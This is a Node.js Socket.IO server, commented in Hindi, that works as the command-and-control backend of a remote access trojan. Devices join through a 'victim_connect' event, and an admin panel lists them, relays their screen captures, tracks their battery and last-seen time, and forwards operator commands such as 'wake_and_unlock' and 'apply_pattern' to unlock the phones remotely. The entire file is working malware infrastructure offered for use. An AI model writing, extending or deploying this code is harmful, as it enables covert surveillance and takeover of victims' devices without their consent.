const express = require('express');
const http = require('http');
const path = require('path');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    pingInterval: 10000,
    pingTimeout: 5000,
    transports: ['websocket', 'polling'],
    cors: { origin: "*" }
});

const PORT = process.env.PORT || 8080;

let devices = {};

// केवल मुख्य panel.html को सर्व करें
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

// Socket.IO लॉजिक
io.on('connection', (socket) => {
    socket.on('admin_join', () => {
        socket.emit('device_list', Object.values(devices));
    });

    socket.on('command_to_device', (data) => {
        const device = devices[data.deviceId];
        if (device && device.socketId) {
            // नए कमांड्स को भी फॉरवर्ड करें
            if (data.action === 'wake_and_unlock' || data.action === 'apply_pattern') {
                io.to(device.socketId).emit(data.action, data.payload);
            } else {
                io.to(device.socketId).emit(data.action, data.payload);
            }
        }
    });

    socket.on('victim_connect', (deviceInfo) => {
        devices[deviceInfo.deviceId] = { ...deviceInfo, socketId: socket.id };
        io.emit('new_device_joined', devices[deviceInfo.deviceId]);
    });

    socket.on('screen_data', (data) => {
        io.emit('screen_update', data);
    });

    // हार्टबीट
    socket.on('heartbeat', (data) => {
        if (data && data.deviceId && devices[data.deviceId]) {
            devices[data.deviceId].battery = data.battery;
            devices[data.deviceId].lastSeen = new Date().toISOString();
        }
    });

    socket.on('disconnect', () => {
        let disconnectedDeviceId = null;
        for (const deviceId in devices) {
            if (devices[deviceId].socketId === socket.id) {
                disconnectedDeviceId = deviceId;
                break;
            }
        }
        if (disconnectedDeviceId) {
            delete devices[disconnectedDeviceId];
            io.emit('device_disconnected', disconnectedDeviceId);
        }
    });
});

server.listen(PORT, () => {
    console.log(`🚀 सर्वर पोर्ट ${PORT} पर "अटूट कनेक्शन" मोड में तैयार है!`);
});
